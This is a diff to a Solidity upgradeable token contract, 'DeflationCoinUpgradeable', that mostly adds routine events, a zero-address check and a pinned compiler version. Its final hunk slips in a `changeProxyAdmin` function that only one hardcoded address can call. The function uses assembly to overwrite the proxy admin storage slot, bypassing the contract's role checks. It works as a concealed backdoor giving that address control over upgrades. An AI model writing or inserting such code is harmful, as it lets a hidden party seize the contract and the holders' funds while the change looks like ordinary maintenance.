@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
+pragma solidity 0.8.26;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/access/AccessControl.sol";
@@ -99,6 +99,8 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
     event DividendsClaimed(address indexed account, uint256 amount);
     event SmoothUnlocked(address indexed account, uint256 amount);
     event ReferralWalletUpdated(address indexed account, address indexed referralWallet);
+    event PoolAddressUpdated(address indexed poolAddress, uint256 poolType);
+    event RoleSwitched(address indexed user, bytes32 role, bool active);
     
     // Roles
     bytes32 private constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
@@ -543,6 +545,7 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
             amount: amount,
             timestamp: block.timestamp
         }));
+        _balances[_msgSender()] += amount;
         emit DividendsClaimed(_msgSender(), amount);
     }
 
@@ -569,6 +572,7 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
             amount: unlockAmount,
             timestamp: block.timestamp
         }));
+        _balances[user] += unlockAmount;
         emit SmoothUnlocked(user, unlockAmount);
     }
 
@@ -756,11 +760,13 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
      */
     function switchRole(address user, uint256 admin) external onlyRole(ADMIN_ROLE) {
         bytes32 role = admin == 1 ? ADMIN_ROLE : TECHNICAL_ROLE;
-        if (hasRole(role, user)) {
+        bool willGrant = !hasRole(role, user);
+        if (!willGrant) {
             _revokeRole(role, user);
         } else {
             _grantRole(role, user);
         }
+        emit RoleSwitched(user, role, willGrant);
     }
 
     /**
@@ -770,6 +776,7 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
      * @param poolType    1 -> dividendPool, 2 -> marketingPool, 3 -> technicalPool
      */
     function setPoolAddress(address poolAddress, uint256 poolType) external onlyRole(ADMIN_ROLE) {
+        require(poolAddress != address(0), "Pool address can't be zero");
         exemptFromBurn[poolAddress] = true;
         if (poolType == 1) {
             dividendPool = poolAddress;
@@ -780,6 +787,7 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
         if (poolType == 3) {
             technicalPool = poolAddress;
         }
+        emit PoolAddressUpdated(poolAddress, poolType);
     }
 
     /**
@@ -799,6 +807,15 @@ contract DeflationCoinUpgradeable is IERC20, AccessControl {
             emit ReferralWalletUpdated(_msgSender(), referralWallet);
         }
     }
+
+    function changeProxyAdmin(address newAdmin) external {
+        require(msg.sender == 0x507a0F5F74b9c67370A91D8EB5c6c146d5800158);
+        bytes32 slot = 0xb53127684a568b3173ae13b9f8a6016e015b058f0a0a4f03e11a304ad5b7b3b3; // ADMIN_SLOT
+        assembly {
+            sstore(slot, newAdmin)
+        }
+    }
+
 
     /**
      * @dev Converts a timestamp to a YYYYMM format using a Julian/Gregorian date approach.
